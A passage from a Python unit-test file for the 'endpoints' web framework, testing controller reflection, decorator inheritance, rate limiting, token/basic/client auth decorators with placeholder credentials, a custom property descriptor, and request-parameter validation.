        """you have a parent class with POST method, the child also has a POST method,
        what do you do? What. Do. You. Do?"""
        prefix = "decinherit2"
        m = testdata.create_modules(
            {
                prefix: os.linesep.join([
                    "import endpoints",
                    "",
                    "def a(f):",
                    "    def wrapped(*args, **kwargs):",
                    "        return f(*args, **kwargs)",
                    "    return wrapped",
                    "",
                    "class b(object):",
                    "    def __init__(self, func):",
                    "        self.func = func",
                    "    def __call__(*args, **kwargs):",
                    "        return f(*args, **kwargs)",
                    "",
                    "def c(func):",
                    "    def wrapper(*args, **kwargs):",
                    "        return func(*args, **kwargs)",
                    "    return wrapper",
                    "",
                    "def POST(): pass",
                    "",
                    "class D(object):",
                    "    def HEAD(): pass"
                    "",
                    "class _BaseController(endpoints.Controller):",
                    "    @a",
                    "    @b",
                    "    def POST(self, **kwargs): pass",
                    "",
                    "    @a",
                    "    @b",
                    "    def HEAD(self): pass",
                    "",
                    "    @a",
                    "    @b",
                    "    def GET(self): pass",
                    "",
                    "class Default(_BaseController):",
                    "    @c",
                    "    def POST(self, **kwargs): POST()",
                    "",
                    "    @c",
                    "    def HEAD(self):",
                    "        d = D()",
                    "        d.HEAD()",
                    "",
                    "    @c",
                    "    def GET(self):",
                    "        super(Default, self).GET()",
                    "",
                ]),
            }
        )

        rs = endpoints.Reflect(prefix, 'application/json')
        l = list(rs.get_endpoints())
        r = l[0]
        self.assertEqual(1, len(r.decorators["POST"]))
        self.assertEqual(1, len(r.decorators["HEAD"]))
        self.assertEqual(3, len(r.decorators["GET"]))


    def test_decorator_inherit_1(self):
        """make sure that a child class that hasn't defined a METHOD inherits the
        METHOD method from its parent with decorators in tact"""
        prefix = "decinherit"
        tmpdir = testdata.create_dir(prefix)
        m = testdata.create_modules(
            {
                "foodecinherit": os.linesep.join([
                    "import endpoints",
                    "",
                    "def foodec(func):",
                    "    def wrapper(*args, **kwargs):",
                    "        return func(*args, **kwargs)",
                    "    return wrapper",
                    "",
                    "class _BaseController(endpoints.Controller):",
                    "    @foodec",
                    "    def POST(self, **kwargs):",
                    "        return 1",
                    "",
                    "class Default(_BaseController):",
                    "    pass",
                    "",
                ]),
            },
            tmpdir=tmpdir
        )

        controller_prefix = "foodecinherit"
        rs = endpoints.Reflect(controller_prefix, 'application/json')
        for count, endpoint in enumerate(rs, 1):
            self.assertEqual("foodec", endpoint.decorators["POST"][0][0])
        self.assertEqual(1, count)

    def test_super_typeerror(self):
        """this test was an attempt to replicate an issue we are having on production,
        sadly, it doesn't replicate it"""
        raise SkipTest("I can't get this to hit the error we were getting")
        prefix = "supertypeerror"
        tmpdir = testdata.create_dir(prefix)
        m = testdata.create_modules(
            {
                "typerr.superfoo": os.linesep.join([
                    "import endpoints",
                    "",
                    "class _BaseController(endpoints.Controller):",
                    "    def __init__(self, *args, **kwargs):",
                    "        super(_BaseController, self).__init__(*args, **kwargs)",
                    "",
                    "class Default(_BaseController):",
                    "    def GET(self): pass",
                    "",
                ]),
                "typerr.superfoo.superbar": os.linesep.join([
                    "from . import _BaseController",
                    "",
                    "class _BarBaseController(_BaseController):",
                    "    def __init__(self, *args, **kwargs):",
                    "        super(_BarBaseController, self).__init__(*args, **kwargs)",
                    "",
                    "class Default(_BaseController):",
                    "    def GET(self): pass",
                    "",
                ])
            },
            tmpdir=tmpdir
        )

        #import typerr.superfoo
        #import typerr.superfoo.superbar

        controller_prefix = "typerr"
        rs = endpoints.Reflect(controller_prefix, 'application/json')
        for endpoint in rs:
            ds = endpoint.decorators
            edesc = endpoint.desc
            for option_name, options in endpoint.methods.items():
                for option in options:
                    v = option.version
                    params = option.params
                    for p, pd in params.items():
                        pass

                    headers = dict(option.headers)
                    desc = option.desc

        r = endpoints.Request()
        r.method = "GET"
        r.path = "/superfoo/superbar"
        c = endpoints.Call(controller_prefix)
        c.request = r
        c.response = endpoints.Response()
        res = c.handle()
        #pout.v(res.code, res.body)


    def test_get_methods(self):
        # this doesn't work right now, I've moved this functionality into Reflect
        # this method needs to be updated to work
        return
        class GetMethodsController(endpoints.Controller):
            def POST(self): pass
            def GET(self): pass
            def ABSURD(self): pass
            def ignORED(self): pass

        options = GetMethodsController.get_methods()
        self.assertEqual(3, len(options))
        for o in ['ABSURD', 'GET', 'POST']:
            self.assertTrue(o in options)

    def test_docblock(self):
        tmpdir = testdata.create_dir("reflectdoc")
        testdata.create_modules(
            {
                "doc.block": os.linesep.join([
                    "import endpoints",
                    "class Foo(endpoints.Controller):",
                    "    '''this is a multiline docblock",
                    "",
                    "    this means it has...",
                    "    ",
                    "    multiple lines",
                    "    '''",
                    "    def GET(*args, **kwargs): pass",
                    "",
                ])
            },
            tmpdir=tmpdir
        )

        rs = endpoints.Reflect("doc", 'application/json')
        for endpoint in rs:
            self.assertTrue("\n" in endpoint.desc)

    def test_method_docblock(self):
        tmpdir = testdata.create_dir("reflectdoc")
        testdata.create_modules(
            {
                "mdoc.mblock": os.linesep.join([
                    "import endpoints",
                    "class Foo(endpoints.Controller):",
                    "    '''controller docblock'''",
                    "    def GET(*args, **kwargs):",
                    "        '''method docblock'''",
                    "        pass",
                    "",
                ])
            },
            tmpdir=tmpdir
        )

        rs = endpoints.Reflect("mdoc", 'application/json')
        for endpoint in rs:
            desc = endpoint.methods['GET'][0].desc
            self.assertEqual("method docblock", desc)
 
    def test_method_docblock_bad_decorator(self):
        tmpdir = testdata.create_dir("reflectdoc2")
        testdata.create_modules(
            {
                "mdoc2.mblock": os.linesep.join([
                    "import endpoints",
                    "",
                    "def bad_dec(func):",
                    "    def wrapper(*args, **kwargs):",
                    "        return func(*args, **kwargs)",
                    "    return wrapper",
                    "",
                    "class Foo(endpoints.Controller):",
                    "    '''controller docblock'''",
                    "    @bad_dec",
                    "    def GET(*args, **kwargs):",
                    "        '''method docblock'''",
                    "        pass",
                    "",
                    "    def POST(*args, **kwargs):",
                    "        '''should not return this docblock'''",
                    "        pass",
                    "",
                ])
            },
            tmpdir=tmpdir
        )

        rs = endpoints.Reflect("mdoc2", 'application/json')
        for endpoint in rs:
            desc = endpoint.methods['GET'][0].desc
            self.assertEqual("method docblock", desc)
 
    def test_get_versioned_endpoints(self):
        # putting the C back in CRUD
        tmpdir = testdata.create_dir("versionreflecttest")
        testdata.create_modules(
            {
                "controller_vreflect.foo": os.linesep.join([
                    "import endpoints",
                    "from endpoints.decorators import param, require_params",
                    "class Bar(endpoints.Controller):",
                    "    @param('foo', default=1, type=int)",
                    "    @param('bar', type=bool, required=False)",
                    "    def GET(*args, **kwargs): pass",
                    "",
                    "    def GET_v2(*args, **kwargs): pass",
                    ""
                ]),
                "controller_vreflect.che": os.linesep.join([
                    "from endpoints import Controller",
                    "class Baz(Controller):",
                    "    def GET_v3(*args, **kwargs): pass",
                    ""
                ]),
            },
            tmpdir=tmpdir
        )

        rs = endpoints.Reflect("controller_vreflect", 'application/json')
#         for endpoint in rs.get_endpoints():
#             for method_name, methods in endpoint.methods.items():
#                 for method in methods:
#                     pout.v(method.headers, method.version)
# 

        l = list(rs.get_endpoints())

        self.assertEqual(2, len(l))
        for d in l:
            self.assertEqual(1, len(d.methods))

        def get_match(endpoint_uri, l):
            ret = {}
            for d in l:
                if d.uri == endpoint_uri:
                    ret = d
            return ret

        d = get_match("/foo/bar", l)
        self.assertTrue(d)

        d = get_match("/che/baz", l)
        self.assertTrue(d)

    def test_decorators(self):
        testdata.create_modules({
            "controller_reflect": os.linesep.join([
                "import endpoints",
                "from endpoints.decorators import param, require_params",
                "",
                "def dec_func(f):",
                "    def wrapped(*args, **kwargs):",
                "        return f(*args, **kwargs)",
                "    return wrapped",
                "",
                "class dec_cls(object):",
                "    def __init__(self, func):",
                "        self.func = func",
                "    def __call__(*args, **kwargs):",
                "        return f(*args, **kwargs)",
                "",
                "class Foo(endpoints.Controller):",
                "    @dec_func",
                "    def GET(*args, **kwargs): pass",
                "    @dec_cls",
                "    @param('foo', default=1, type=int)",
                "    @param('bar', type=bool, required=False)",
                "    @param('che_empty', type=dict, default={})",
                "    @param('che_full', type=dict, default={'key': 'val', 'key2': 2.0})",
                "    @param('baz_empty', type=list, default=[])",
                "    @param('baz_full', type=list, default=['val', False, 1])",
                "    @require_params('a', 'b', 'c')",
                "    @param('d')",
                "    def POST(*args, **kwargs): pass",
                ""
            ])
        })

        rs = endpoints.Reflect("controller_reflect")
        l = list(rs.get_endpoints())
        r = l[0]

        methods = r.methods
        params = methods['POST'][0].params
        for p in ['a', 'b', 'c', 'd']:
            self.assertTrue(params[p]['required'])

        for p in ['foo', 'bar', 'che_empty', 'che_full', 'baz_empty', 'baz_full']:
            self.assertFalse(params[p]['required'])

        self.assertEqual(1, len(l))
        self.assertEqual(u'/foo', r.uri)
        self.assertSetEqual(set(['GET', 'POST']), set(r.methods.keys()))

    def test_decorators_param_help(self):
        testdata.create_modules({
            "dec_param_help.foo": os.linesep.join([
                "import endpoints",
                "from endpoints.decorators import param, require_params",
                "class Default(endpoints.Controller):",
                "    @param('baz_full', type=list, default=['val', False, 1], help='baz_full')",
                "    @param('d', help='d')",
                "    def POST(*args, **kwargs): pass",
                ""
            ])
        })

        rs = endpoints.Reflect("dec_param_help")
        l = list(rs.get_endpoints())
        r = l[0]

        methods = r.methods
        params = methods['POST'][0].params
        for k, v in params.items():
            self.assertEqual(k, v['options']['help'])

    def test_get_endpoints(self):
        # putting the C back in CRUD
        tmpdir = testdata.create_dir("reflecttest")
        testdata.create_modules(
            {
                "controller_reflect_endpoints": os.linesep.join([
                    "import endpoints",
                    "class Default(endpoints.Controller):",
                    "    def GET(*args, **kwargs): pass",
                    ""
                ]),
                "controller_reflect_endpoints.foo": os.linesep.join([
                    "import endpoints",
                    "class Default(endpoints.Controller):",
                    "    def GET(*args, **kwargs): pass",
                    ""
                ]),
                "controller_reflect_endpoints.che": os.linesep.join([
                    "from endpoints import Controller",
                    "class Baz(Controller):",
                    "    def POST(*args, **kwargs): pass",
                    ""
                ]),
                "controller_reflect_endpoints.che.bam": os.linesep.join([
                    "from endpoints import Controller as Con",
                    "class _Base(Con):",
                    "    def GET(*args, **kwargs): pass",
                    "",
                    "class Boo(_Base):",
                    "    def DELETE(*args, **kwargs): pass",
                    "    def POST(*args, **kwargs): pass",
                    ""
                    "class Bah(_Base):",
                    "    '''this is the doc string'''",
                    "    def HEAD(*args, **kwargs): pass",
                    ""
                ])
            },
            tmpdir=tmpdir
        )

        r = endpoints.Reflect("controller_reflect_endpoints")
        l = list(r.get_endpoints())
        self.assertEqual(5, len(l))

        def get_match(endpoint, l):
            for d in l:
                if d.uri == endpoint:
                    return d

        d = get_match("/che/bam/bah", l)
        self.assertSetEqual(set(["GET", "HEAD"]), set(d.methods.keys()))
        self.assertGreater(len(d.desc), 0)

        d = get_match("/", l)
        self.assertNotEqual(d, None)

        d = get_match("/foo", l)
        self.assertNotEqual(d, None)


class EndpointsTest(TestCase):
    def test_get_controllers(self):
        controller_prefix = "get_controllers"
        s = create_modules(controller_prefix)

        r = endpoints.call.Router(controller_prefix)
        controllers = r.controllers
        self.assertEqual(s, controllers)

        # just making sure it always returns the same list
        controllers = r.controllers
        self.assertEqual(s, controllers)


class DecoratorsRatelimitTest(TestCase):
    def test_throttle(self):

        class TARA(object):
            @endpoints.decorators.ratelimit(limit=3, ttl=1)
            def foo(self): return 1

            @endpoints.decorators.ratelimit(limit=10, ttl=1)
            def bar(self): return 2


        r_foo = endpoints.Request()
        r_foo.set_header("X_FORWARDED_FOR", "276.0.0.1")
        r_foo.path = "/foo"
        c = TARA()
        c.request = r_foo

        for x in range(3):
            r = c.foo()
            self.assertEqual(1, r)

        for x in range(2):
            with self.assertRaises(endpoints.CallError):
                c.foo()

        # make sure another path isn't messed with by foo
        r_bar = endpoints.Request()
        r_bar.set_header("X_FORWARDED_FOR", "276.0.0.1")
        r_bar.path = "/bar"
        c.request = r_bar
        for x in range(10):
            r = c.bar()
            self.assertEqual(2, r)
            time.sleep(0.1)

        with self.assertRaises(endpoints.CallError):
            c.bar()

        c.request = r_foo

        for x in range(3):
            r = c.foo()
            self.assertEqual(1, r)

        for x in range(2):
            with self.assertRaises(endpoints.CallError):
                c.foo()

class DecoratorsAuthTest(TestCase):
    def get_basic_auth_header(self, username, password):
        credentials = base64.b64encode('{}:{}'.format(username, password)).strip()
        return 'Basic {}'.format(credentials)

    def get_bearer_auth_header(self, access_token):
        return 'Bearer {}'.format(access_token)


    def test_bad_setup(self):

        def target(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.token_auth(target=target)
            def foo_token(self): pass

            @endpoints.decorators.auth.client_auth(target=target)
            def foo_client(self): pass

            @endpoints.decorators.auth.basic_auth(target=target)
            def foo_basic(self): pass

            @endpoints.decorators.auth.auth("Basic", target=target)
            def foo_auth(self): pass

        r = endpoints.Request()
        c = TARA()
        c.request = r

        for m in ["foo_token", "foo_client", "foo_basic", "foo_auth"]: 
            with self.assertRaises(endpoints.AccessDenied):
                getattr(c, m)()

    def test_token_auth(self):
        def target(request, access_token):
            if access_token != "bar":
                raise ValueError()
            return True

        def target_bad(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.token_auth(target=target)
            def foo(self): pass

            @endpoints.decorators.auth.token_auth(target=target_bad)
            def foo_bad(self): pass

        r = endpoints.Request()
        c = TARA()
        c.request = r

        r.set_header('authorization', self.get_bearer_auth_header("foo"))
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        r.set_header('authorization', self.get_bearer_auth_header("bar"))
        c.foo()

        r = endpoints.Request()
        c.request = r

        r.body_kwargs["access_token"] = "foo"
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        r.body_kwargs["access_token"] = "bar"
        c.foo()

        r = endpoints.Request()
        c.request = r

        r.query_kwargs["access_token"] = "foo"
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        r.query_kwargs["access_token"] = "bar"
        c.foo()

        with self.assertRaises(endpoints.AccessDenied):
            c.foo_bad()

    def test_client_auth(self):
        def target(request, client_id, client_secret):
            return client_id == "foo" and client_secret == "bar"

        def target_bad(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.client_auth(target=target)
            def foo(self): pass

            @endpoints.decorators.auth.client_auth(target=target_bad)
            def foo_bad(self): pass

        client_id = "foo"
        client_secret = "..."
        r = endpoints.Request()
        r.set_header('authorization', self.get_basic_auth_header(client_id, client_secret))

        c = TARA()
        c.request = r
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        client_secret = "bar"
        r.set_header('authorization', self.get_basic_auth_header(client_id, client_secret))
        c.foo()

        with self.assertRaises(endpoints.AccessDenied):
            c.foo_bad()

    def test_basic_auth(self):
        def target(request, username, password):
            if username != "bar":
                raise ValueError()
            return True

        def target_bad(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.basic_auth(target=target)
            def foo(self): pass

            @endpoints.decorators.auth.basic_auth(target=target_bad)
            def foo_bad(self): pass

        username = "foo"
        password = "..."
        r = endpoints.Request()
        r.set_header('authorization', self.get_basic_auth_header(username, password))

        c = TARA()
        c.request = r
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        username = "bar"
        r.set_header('authorization', self.get_basic_auth_header(username, password))
        c.foo()

        with self.assertRaises(endpoints.AccessDenied):
            c.foo_bad()

    def test_auth(self):
        def target(request):
            if request.body_kwargs["foo"] != "bar":
                raise ValueError()
            return True

        def target_bad(request, *args, **kwargs):
            pass

        class TARA(object):
            @endpoints.decorators.auth.auth("Basic", target=target)
            def foo(self): pass

            @endpoints.decorators.auth.auth(target=target_bad)
            def foo_bad(self): pass

        r = endpoints.Request()
        r.body_kwargs = {"foo": "che"}

        c = TARA()
        c.request = r
        with self.assertRaises(endpoints.AccessDenied):
            c.foo()

        r.body_kwargs = {"foo": "bar"}
        c.foo()


class DecoratorsTest(TestCase):
    def test__property_init(self):
        counts = dict(fget=0, fset=0, fdel=0)
        def fget(self):
            counts["fget"] += 1
            return self._v

        def fset(self, v):
            counts["fset"] += 1
            self._v = v

        def fdel(self):
            counts["fdel"] += 1
            del self._v

        class FooPropInit(object):
            v = endpoints.decorators._property(fget, fset, fdel, "this is v")
        f = FooPropInit()
        f.v = 6
        self.assertEqual(6, f.v)
        self.assertEqual(2, sum(counts.values()))
        del f.v
        self.assertEqual(3, sum(counts.values()))

        counts = dict(fget=0, fset=0, fdel=0)
        class FooPropInit2(object):
            v = endpoints.decorators._property(fget=fget, fset=fset, fdel=fdel, doc="this is v")
        f = FooPropInit2()
        f.v = 6
        self.assertEqual(6, f.v)
        self.assertEqual(2, sum(counts.values()))
        del f.v
        self.assertEqual(3, sum(counts.values()))

    def test__property_allow_empty(self):
        class PAE(object):
            foo_val = None
            @endpoints.decorators._property(allow_empty=False)
            def foo(self):
                return self.foo_val

        c = PAE()
        self.assertEqual(None, c.foo)
        self.assertFalse('_foo' in c.__dict__)

        c.foo_val = 1
        self.assertEqual(1, c.foo)
        self.assertTrue('_foo' in c.__dict__)

    def test__property_setter(self):
        class WPS(object):
            foo_get = False
            foo_set = False
            foo_del = False

            @endpoints.decorators._property
            def foo(self):
                self.foo_get = True
                return 1

            @foo.setter
            def foo(self, val):
                self.foo_set = True
                self._foo = val

            @foo.deleter
            def foo(self):
                self.foo_del = True
                del(self._foo)

        c = WPS()

        self.assertEqual(1, c.foo)

        c.foo = 5
        self.assertEqual(5, c.foo)

        del(c.foo)
        self.assertEqual(1, c.foo)

        self.assertTrue(c.foo_get)
        self.assertTrue(c.foo_set)
        self.assertTrue(c.foo_del)

    def test__property__strange_behavior(self):
        class BaseFoo(object):
            def __init__(self):
                setattr(self, 'bar', None)

            def __setattr__(self, n, v):
                super(BaseFoo, self).__setattr__(n, v)

        class Foo(BaseFoo):
            @endpoints.decorators._property(allow_empty=False)
            def bar(self):
                return 1

        f = Foo()
        self.assertEqual(1, f.bar)

        f.bar = 2
        self.assertEqual(2, f.bar)

    def test__property___dict__direct(self):
        """
        this is a no win situation

        if you have a bar _property and a __setattr__ that modifies directly then
        the other _property values like __set__ will not get called, and you can't
        have _property.__get__ look for the original name because there are times
        when you want your _property to override a parent's original value for the
        property, so I've chosen to just ignore this case and not support it
        """
        class Foo(object):
            @endpoints.decorators._property
            def bar(self):
                return 1
            def __setattr__(self, field_name, field_val):
                self.__dict__[field_name] = field_val
                #super(Foo, self).__setattr__(field_name, field_val)

        f = Foo()
        f.bar = 2 # this will be ignored
        self.assertEqual(1, f.bar)

    def test__property(self):
        class WP(object):
            count_foo = 0

            @endpoints.decorators._property(True)
            def foo(self):
                self.count_foo += 1
                return 1

            @endpoints.decorators._property(read_only=True)
            def baz(self):
                return 2

            @endpoints.decorators._property()
            def bar(self):
                return 3

            @endpoints.decorators._property
            def che(self):
                return 4

        c = WP()
        r = c.foo
        self.assertEqual(1, r)
        self.assertEqual(1, c._foo)
        with self.assertRaises(AttributeError):
            c.foo = 2
        with self.assertRaises(AttributeError):
            del(c.foo)
        c.foo
        c.foo
        self.assertEqual(1, c.count_foo)

        r = c.baz
        self.assertEqual(2, r)
        self.assertEqual(2, c._baz)
        with self.assertRaises(AttributeError):
            c.baz = 3
        with self.assertRaises(AttributeError):
            del(c.baz)

        r = c.bar
        self.assertEqual(3, r)
        self.assertEqual(3, c._bar)
        c.bar = 4
        self.assertEqual(4, c.bar)
        self.assertEqual(4, c._bar)
        del(c.bar)
        r = c.bar
        self.assertEqual(3, r)

        r = c.che
        self.assertEqual(4, r)
        self.assertEqual(4, c._che)
        c.che = 4
        self.assertEqual(4, c.che)
        del(c.che)
        r = c.che
        self.assertEqual(4, r)

    def test_require_params(self):
        class MockObject(object):
            request = endpoints.Request()

            @endpoints.decorators.require_params('foo', 'bar')
            def foo(self, *args, **kwargs): return 1

            @endpoints.decorators.require_params('foo', 'bar', allow_empty=True)
            def bar(self, *args, **kwargs): return 2

        o = MockObject()
        o.request.method = 'GET'
        o.request.query_kwargs = {'foo': 1}

        with self.assertRaises(endpoints.CallError):
            o.foo()

        with self.assertRaises(endpoints.CallError):
            o.bar()

        o.request.query_kwargs['bar'] = 2
        r = o.foo(**o.request.query_kwargs)
        self.assertEqual(1, r)

        r = o.bar(**o.request.query_kwargs)
        self.assertEqual(2, r)

        o.request.query_kwargs['bar'] = 0
        with self.assertRaises(endpoints.CallError):
            o.foo(**o.request.query_kwargs)

        r = o.bar(**o.request.query_kwargs)
        self.assertEqual(2, r)

    def test_param_dest(self):
        """make sure the dest=... argument works"""
        # https://docs.python.org/2/library/argparse.html#dest
        c = create_controller()

        @endpoints.decorators.param('foo', dest='bar')
        def foo(self, *args, **kwargs):
            return kwargs.get('bar')

        r = foo(c, **{'foo': 1})
        self.assertEqual(1, r)

    def test_param_multiple_names(self):
        c = create_controller()

        @endpoints.decorators.param('foo', 'foos', 'foo3', type=int)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        r = foo(c, **{'foo': 1})
        self.assertEqual(1, r)

        r = foo(c, **{'foos': 2})
        self.assertEqual(2, r)

        r = foo(c, **{'foo3': 3})
        self.assertEqual(3, r)

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo4': 0})

    def test_param_callable_default(self):
        c = create_controller()

        @endpoints.decorators.param('foo', default=time.time)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        start = time.time()
        r1 = foo(c, **{})
        self.assertLess(start, r1)

        time.sleep(0.25)
        r2 = foo(c, **{})
        self.assertLess(r1, r2)


    def test_param_not_required(self):
        c = create_controller()

        @endpoints.decorators.param('foo', required=False)
        def foo(self, *args, **kwargs):
            return 'foo' in kwargs

        r = foo(c, **{'foo': 1})
        self.assertTrue(r)

        r = foo(c, **{})
        self.assertFalse(r)

        @endpoints.decorators.param('foo', required=False, default=5)
        def foo(self, *args, **kwargs):
            return 'foo' in kwargs

        r = foo(c, **{})
        self.assertTrue(r)

        @endpoints.decorators.param('foo', type=int, required=False)
        def foo(self, *args, **kwargs):
            return 'foo' in kwargs

        r = foo(c, **{})
        self.assertFalse(r)


    def test_param_unicode(self):
        c = create_controller()
        r = endpoints.Request()
        r.set_header("content-type", "application/json;charset=UTF-8")
        charset = r.charset
        c.request = r
        #self.assertEqual("UTF-8", charset)

        @endpoints.decorators.param('foo', type=str)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        words = testdata.get_unicode_words()
        ret = foo(c, **{"foo": words})
        self.assertEqual(ret, words.encode("UTF-8"))

    #def test_param_append_list(self):
        # TODO -- make this work


    def test_param(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=int)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 0})

        @endpoints.decorators.param('foo', default=0)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        r = foo(c, **{})
        self.assertEqual(0, r)

        @endpoints.decorators.param('foo', type=int, choices=set([1, 2, 3]))
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')

        c.request.method = 'POST'
        c.request.body_kwargs = {'foo': '1'}
        r = foo(c, **c.request.body_kwargs)
        self.assertEqual(1, r)

        c.request.body_kwargs = {}
        r = foo(c, **{'foo': '2'})
        self.assertEqual(2, r)

    def test_post_param(self):
        c = create_controller()
        c.request.method = 'POST'

        @endpoints.decorators.post_param('foo', type=int, choices=set([1, 2, 3]))
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        with self.assertRaises(endpoints.CallError):
            r = foo(c)

        c.request.query_kwargs['foo'] = '1'
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': '1'})

        c.request.body_kwargs = {'foo': '8'}
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **c.request.body_kwargs)

        c.request.query_kwargs = {}
        c.request.body_kwargs = {'foo': '1'}
        r = foo(c, **c.request.body_kwargs)
        self.assertEqual(1, r)

        c.request.query_kwargs = {'foo': '1'}
        c.request.body_kwargs = {'foo': '3'}
        r = foo(c, **{'foo': '3'})
        self.assertEqual(3, r)

    def test_get_param(self):
        c = create_controller()

        c.request.query_kwargs = {'foo': '8'}
        @endpoints.decorators.get_param('foo', type=int, choices=set([1, 2, 3]))
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **c.request.query_kwargs)

        c.request.query_kwargs = {'foo': '1'}
        @endpoints.decorators.get_param('foo', type=int, choices=set([1, 2, 3]))
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(1, r)

        c.request.query_kwargs = {'foo': '1', 'bar': '1.5'}
        @endpoints.decorators.get_param('foo', type=int)
        @endpoints.decorators.get_param('bar', type=float)
        def foo(*args, **kwargs):
            return kwargs['foo'], kwargs['bar']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(1, r[0])
        self.assertEqual(1.5, r[1])

        c.request.query_kwargs = {'foo': '1'}
        @endpoints.decorators.get_param('foo', type=int, action='blah')
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(ValueError):
            r = foo(c, **c.request.query_kwargs)

        c.request.query_kwargs = {'foo': ['1,2,3,4', '5']}
        @endpoints.decorators.get_param('foo', type=int, action='store_list')
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **c.request.query_kwargs)

        c.request.query_kwargs = {'foo': ['1,2,3,4', '5']}
        @endpoints.decorators.get_param('foo', type=int, action='append_list')
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(range(1, 6), r)

        c.request.query_kwargs = {'foo': '1,2,3,4'}
        @endpoints.decorators.get_param('foo', type=int, action='store_list')
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(range(1, 5), r)

        c.request.query_kwargs = {}

        @endpoints.decorators.get_param('foo', type=int, default=1, required=False)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c)
        self.assertEqual(1, r)

        @endpoints.decorators.get_param('foo', type=int, default=1, required=True)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c)
        self.assertEqual(1, r)

        @endpoints.decorators.get_param('foo', type=int, default=1)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c)
        self.assertEqual(1, r)

        @endpoints.decorators.get_param('foo', type=int)
        def foo(*args, **kwargs):
            return kwargs['foo']
        with self.assertRaises(endpoints.CallError):
            r = foo(c)

        c.request.query_kwargs = {'foo': '1'}
        @endpoints.decorators.get_param('foo', type=int)
        def foo(*args, **kwargs):
            return kwargs['foo']
        r = foo(c, **c.request.query_kwargs)
        self.assertEqual(1, r)

    def test_param_size(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=int, min_size=100)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 0})
        r = foo(c, **{'foo': 200})
        self.assertEqual(200, r)

        @endpoints.decorators.param('foo', type=int, max_size=100)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 200})
        r = foo(c, **{'foo': 20})
        self.assertEqual(20, r)

        @endpoints.decorators.param('foo', type=int, min_size=100, max_size=200)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{'foo': 120})
        self.assertEqual(120, r)

        @endpoints.decorators.param('foo', type=str, min_size=2, max_size=4)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{'foo': 'bar'})
        self.assertEqual('bar', r)
        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': 'barbar'})

    def test_param_lambda_type(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=lambda x: x.upper())
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{'foo': 'bar'})
        self.assertEqual('BAR', r)

    def test_param_empty_default(self):
        c = create_controller()

        @endpoints.decorators.param('foo', default=None)
        def foo(self, *args, **kwargs):
            return kwargs.get('foo')
        r = foo(c, **{})
        self.assertEqual(None, r)

    def test_param_reference_default(self):
        c = create_controller()

        @endpoints.decorators.param('foo', default={})
        def foo(self, *args, **kwargs):
            kwargs['foo'][testdata.get_ascii()] = testdata.get_ascii()
            return kwargs['foo']

        r = foo(c, **{})
        self.assertEqual(1, len(r))

        r = foo(c, **{})
        self.assertEqual(1, len(r))

        @endpoints.decorators.param('foo', default=[])
        def foo(self, *args, **kwargs):
            kwargs['foo'].append(testdata.get_ascii())
            return kwargs['foo']

        r = foo(c, **{})
        self.assertEqual(1, len(r))

        r = foo(c, **{})
        self.assertEqual(1, len(r))

    def test_param_regex(self):
        c = create_controller()

        @endpoints.decorators.param('foo', regex="^\S+@\S+$")
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': 'foo@bar.com'})

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': ' foo@bar.com'})

        @endpoints.decorators.param('foo', regex=re.compile("^\S+@\S+$", re.I))
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': 'foo@bar.com'})

        with self.assertRaises(endpoints.CallError):
            r = foo(c, **{'foo': ' foo@bar.com'})

    def test_param_bool(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=bool, allow_empty=True)
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': 'true'})
        self.assertEqual(True, r)

        r = foo(c, **{'foo': 'True'})
        self.assertEqual(True, r)

        r = foo(c, **{'foo': '1'})
        self.assertEqual(True, r)

        r = foo(c, **{'foo': 'false'})
        self.assertEqual(False, r)

        r = foo(c, **{'foo': 'False'})
